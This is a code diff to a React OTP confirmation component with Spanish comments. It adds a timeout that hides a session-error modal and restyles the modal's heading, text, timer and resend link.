@@ -428,6 +428,16 @@ export default function NumeroOTP() {
                             lanzarModalErrorSesion: true
                         }));
 
+                        // Se quita el modal a los 2 segundos
+                        setTimeout(() => {
+
+                            // Se oculta el modal de error de sesión OTP
+                            setFormState(prev => ({
+                                ...prev,
+                                lanzarModalErrorSesion: false
+                            }));
+                        }, 2000);
+
                         // Se sale del ciclo
                         break;
                     case 'solicitar_din':
@@ -559,16 +569,16 @@ export default function NumeroOTP() {
                             ✕
                         </button>
 
-                        <h2 style={{ fontSize: "20px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
+                        <h2 className="bc-cibsans-font-style-9-extralight  mb-0" style={{ fontSize: 22, color: "white", fontWeight: "700", textAlign: "left" }}>
                             Confirma tus datos
                         </h2>
 
-                        <p style={{ fontSize: "14px", marginBottom: "30px", color: "#e0e0e0" }}>
+                        <p className="bc-cibsans-font-style-9-extralight mt-0" style={{ fontSize: 16, color: "white", textAlign: "left", lineHeight: 1.8 }}>
                             Ingresa el código que te enviamos por mensaje de texto.
                         </p>
 
                         {/* Circular Timer */}
-                        <div style={{ position: "relative", width: "100px", height: "100px", margin: "0 auto 40px" }}>
+                        <div style={{ position: "relative", width: "100px", height: "100px", margin: "0 auto 40px", marginTop: "10%" }}>
                             <svg width="100" height="100" style={{ transform: "rotate(-90deg)" }}>
                                 <circle cx="50" cy="50" r={radius} stroke="#4a4a4a" strokeWidth="6" fill="transparent" />
                                 <circle
@@ -595,7 +605,7 @@ export default function NumeroOTP() {
                             </div>
                             {activeResend ?
                                 <div>
-                                    <p style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
+                                    <p style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer", textAlign: "center" }} onClick={() => handleResend()}>
                                         Reenviar código OTP
                                     </p>
                                 </div> : null}
@@ -638,8 +648,8 @@ export default function NumeroOTP() {
                             ))}
                         </div>
 
-                        <p style={{ fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
-                            Búscalo en el número de teléfono registrado
+                        <p className="bc-cibsans-font-style-9-extralight mt-0" style={{ fontSize: "14px", marginBottom: "5px", color: "#ffffff", textAlign: "left" }} >
+                            Búscalo en el número de teléfono registrado.
                         </p>
 
                         <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
